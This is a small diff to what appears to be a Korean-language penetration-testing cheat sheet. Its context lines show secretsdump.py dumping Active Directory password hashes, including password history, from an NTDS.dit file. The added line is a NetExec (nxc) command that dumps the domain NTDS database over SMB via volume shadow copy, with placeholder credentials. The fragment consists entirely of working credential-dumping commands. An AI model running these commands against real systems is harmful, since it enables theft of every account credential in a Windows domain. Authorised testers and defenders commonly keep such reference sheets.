@@ -653,6 +653,9 @@ secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 # 과거 비밀번호 확인
 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -history
 ```
+```bash
+nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss
+```
  
 </details>
 
